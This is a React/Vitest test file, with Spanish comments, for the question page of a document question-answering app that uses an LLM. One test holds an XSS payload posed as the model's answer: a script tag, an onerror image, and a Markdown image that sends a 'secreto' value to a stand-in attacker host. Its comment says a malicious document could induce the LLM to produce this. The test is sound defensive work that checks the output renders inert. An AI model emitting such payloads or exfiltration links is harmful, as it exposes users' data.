import { render, screen } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { describe, expect, it } from 'vitest'
import { makeDocument, makeFolder } from '../test/fixtures'
import { jsonResponse, mockFetch } from '../test/mockFetch'
import type { QueryResponse } from '../types/api'
import { AskPage } from './AskPage'

const SOURCE = {
  document_id: '11111111-1111-4111-8111-111111111111',
  filename: 'manual.pdf',
  page_number: 3,
  source_type: 'chunk' as const,
  chunk_id: 'c1',
  excerpt: 'Cada empleado dispone de 22 días hábiles.',
  score: 0.03,
}

async function ask(question: string) {
  // paste en lugar de type: type genera eventos tecla a tecla y es lento en jsdom.
  await userEvent.click(screen.getByLabelText('Pregunta'))
  await userEvent.paste(question)
  await userEvent.click(screen.getByRole('button', { name: 'Preguntar' }))
}

describe('AskPage', () => {
  it('muestra la respuesta con sus fuentes enlazadas', async () => {
    const answer: QueryResponse = {
      answer: 'Tienes 22 días hábiles de vacaciones.',
      sources: [SOURCE],
      insufficient_evidence: false,
    }
    const fetchSpy = mockFetch(jsonResponse([]), jsonResponse(answer))
    render(<AskPage />)

    await ask('  ¿Cuántos días de vacaciones?  ')

    expect(await screen.findByText(answer.answer)).toBeInTheDocument()
    expect(screen.getByRole('link', { name: 'manual.pdf' })).toHaveAttribute(
      'href',
      `#/documentos/${SOURCE.document_id}`,
    )
    const pageLink = screen.getByRole('link', { name: 'Abrir manual.pdf en la página 3' })
    expect(pageLink).toHaveAttribute('href', `/api/v1/documents/${SOURCE.document_id}/file#page=3`)
    expect(pageLink).toHaveAttribute('target', '_blank')
    expect(pageLink).toHaveAttribute('rel', 'noopener noreferrer')
    expect(screen.getByText(SOURCE.excerpt)).toBeInTheDocument()
    // La pregunta se envía sin espacios sobrantes.
    expect(JSON.parse(fetchSpy.mock.calls[1][1]?.body as string)).toEqual({
      question: '¿Cuántos días de vacaciones?',
    })
  })

  it('identifica las fuentes que son el resumen de un documento', async () => {
    mockFetch(
      jsonResponse([]),
      jsonResponse({
        answer: 'Es un manual de recursos humanos.',
        sources: [
          {
            ...SOURCE,
            source_type: 'summary',
            chunk_id: null,
            page_number: null,
            score: null,
            excerpt: 'Manual de recursos humanos.',
          },
        ],
        insufficient_evidence: false,
      }),
    )
    render(<AskPage />)

    await ask('¿De qué trata?')

    expect(await screen.findByText('Resumen del documento')).toBeInTheDocument()
    expect(screen.queryByText(/página/)).not.toBeInTheDocument()
  })

  it('explica cuando no hay evidencia suficiente', async () => {
    mockFetch(
      jsonResponse([]),
      jsonResponse({
        answer: 'No encontré información en los documentos disponibles.',
        sources: [],
        insufficient_evidence: true,
      }),
    )
    render(<AskPage />)

    await ask('¿Receta de paella?')

    expect(await screen.findByText('Sin evidencia suficiente')).toBeInTheDocument()
    expect(screen.queryByText('Fuentes')).not.toBeInTheDocument()
  })

  it('muestra los errores del servidor de forma comprensible', async () => {
    mockFetch(jsonResponse([]), jsonResponse({ detail: 'El proveedor de LLM no tiene saldo.' }, 503))
    render(<AskPage />)

    await ask('hola')

    expect(await screen.findByRole('alert')).toHaveTextContent('no tiene saldo')
  })

  it('no permite enviar una pregunta vacía', () => {
    mockFetch(jsonResponse([]))
    render(<AskPage />)

    expect(screen.getByRole('button', { name: 'Preguntar' })).toBeDisabled()
  })

  it('muestra el HTML de una respuesta del LLM como texto inerte (XSS)', async () => {
    // Un documento malicioso podría inducir al LLM a devolver HTML o Markdown peligroso.
    const malicious =
      'Respuesta <img src=x onerror="alert(1)"> <script>alert(2)</script> ' +
      '![x](https://atacante.example/robar?d=secreto)'
    mockFetch(
      jsonResponse([]),
      jsonResponse({ answer: malicious, sources: [SOURCE], insufficient_evidence: false }),
    )
    const { container } = render(<AskPage />)

    await ask('hola')

    expect(await screen.findByText(malicious)).toBeInTheDocument()
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('a[href*="atacante"]')).toBeNull()
  })

  it('pregunta solo sobre un documento y una página', async () => {
    const document = makeDocument({ original_filename: 'cronica.pdf' })
    const answer: QueryResponse = {
      answer: 'Fue en 1520.',
      sources: [{ ...SOURCE, document_id: document.id, page_number: 65 }],
      insufficient_evidence: false,
    }
    const fetchSpy = mockFetch(jsonResponse(document), jsonResponse(answer))
    render(<AskPage documentId={document.id} />)

    expect(await screen.findByText('cronica.pdf')).toBeInTheDocument()
    await userEvent.type(screen.getByLabelText('Página'), '65')
    await ask('¿En qué año fue esto?')

    expect(await screen.findByText('Fue en 1520.')).toBeInTheDocument()
    expect(JSON.parse(fetchSpy.mock.calls[1][1]?.body as string)).toEqual({
      question: '¿En qué año fue esto?',
      document_id: document.id,
      page_number: 65,
    })
    expect(screen.getByRole('link', { name: 'Preguntar a todos los documentos' })).toHaveAttribute(
      'href',
      '#/preguntar',
    )
  })

  it('no permite preguntar si el documento no existe', async () => {
    mockFetch(jsonResponse({ detail: 'Document not found' }, 404))
    render(<AskPage documentId="11111111-1111-4111-8111-111111111111" />)

    expect(await screen.findByRole('alert')).toHaveTextContent('El documento no existe.')
    await userEvent.click(screen.getByLabelText('Pregunta'))
    await userEvent.paste('¿Algo?')
    expect(screen.getByRole('button', { name: 'Preguntar' })).toBeDisabled()
  })

  it('pregunta solo a una carpeta', async () => {
    const folder = makeFolder({ name: 'RR. HH.', document_count: 2 })
    const answer: QueryResponse = { answer: '22 días.', sources: [SOURCE], insufficient_evidence: false }
    const fetchSpy = mockFetch(jsonResponse([folder]), jsonResponse(answer))
    render(<AskPage />)

    await userEvent.selectOptions(await screen.findByLabelText('Buscar en'), 'RR. HH. (2)')
    await ask('¿Cuántos días de vacaciones?')

    expect(await screen.findByText('22 días.')).toBeInTheDocument()
    expect(JSON.parse(fetchSpy.mock.calls[1][1]?.body as string)).toEqual({
      question: '¿Cuántos días de vacaciones?',
      folder_id: folder.id,
    })
  })

  it('preselecciona la carpeta del enlace y avisa si ya no existe', async () => {
    mockFetch(jsonResponse([makeFolder()]))
    render(<AskPage folderId="99999999-9999-4999-8999-999999999999" />)

    expect(await screen.findByRole('alert')).toHaveTextContent('La carpeta no existe')
    await userEvent.click(screen.getByLabelText('Pregunta'))
    await userEvent.paste('¿Algo?')
    expect(screen.getByRole('button', { name: 'Preguntar' })).toBeDisabled()
  })
})
